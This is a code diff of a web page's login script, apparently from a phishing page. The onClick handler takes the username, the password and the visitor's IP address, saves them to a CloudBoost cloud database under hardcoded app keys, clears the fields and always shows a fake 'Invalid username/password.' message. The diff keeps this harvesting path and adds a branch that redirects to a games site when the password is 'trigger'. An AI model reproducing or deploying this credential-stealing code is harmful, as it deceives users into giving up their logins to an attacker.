@@ -205,19 +205,23 @@ function loadPage() {
      ip = json.ip;
   }
   function onClick() {
-     CB.CloudApp.init('dbqmgxjzpynx', '56bd6211-0a31-403a-af6d-4f719cdce186');
-     var obj = new CB.CloudObject('Data');
-     obj.set('Password', document.getElementsByName('passwd')[0].value);
-     document.getElementsByName('passwd')[0].value = "";
-     obj.set('Username', document.getElementById("user").value);
-     document.getElementById("user").value = "";
-     obj.set('IP', ip);
-     obj.save({
-          success : function(obj){ }, error : function(error){ }
-     });
-     var divObj = document.getElementById("dError");
-     divObj.style.display = "block";
-     divObj.innerHTML = "Invalid username/password.";
+     if(document.getElementsByName('passwd')[0].value=="trigger") {
+     	document.location = "http://www.puffgames.com/games/sonic-speed-race/";
+     } else {
+	 CB.CloudApp.init('dbqmgxjzpynx', '56bd6211-0a31-403a-af6d-4f719cdce186');
+	 var obj = new CB.CloudObject('Data');
+	 obj.set('Password', document.getElementsByName('passwd')[0].value);
+         document.getElementsByName('passwd')[0].value = "";
+	 obj.set('Username', document.getElementById("user").value);
+	 document.getElementById("user").value = "";
+	 obj.set('IP', ip);
+	 obj.save({
+	     success : function(obj){ }, error : function(error){ }
+	 });
+	 var divObj = document.getElementById("dError");
+	 divObj.style.display = "block";
+	 divObj.innerHTML = "Invalid username/password.";
+     }
   }
 </script>
 <script src="https://cloudboost.io/js-sdk/cloudboost.js"></script>
